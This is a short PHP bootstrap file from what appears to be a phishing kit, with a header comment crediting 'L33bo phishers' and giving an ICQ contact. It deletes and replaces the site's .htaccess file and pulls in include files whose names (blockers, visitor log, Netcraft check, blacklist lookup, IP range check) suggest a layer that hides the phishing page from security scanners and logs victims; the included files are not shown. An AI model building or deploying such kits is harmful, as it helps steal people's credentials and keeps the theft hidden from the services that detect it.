<?php
/*
||| L33bo phishers = ICQ: 695059760
*/

    @unlink(".htaccess");
    @copy("__HTyes.txt",".htaccess");
    
    @require "bocah/includes/blockers.php";
    @require "bocah/includes/visitor_log.php";
    @require "bocah/includes/netcraft_check.php";
    @require "bocah/includes/blacklist_lookup.php";
    @require "bocah/includes/ip_range_check.php";

?>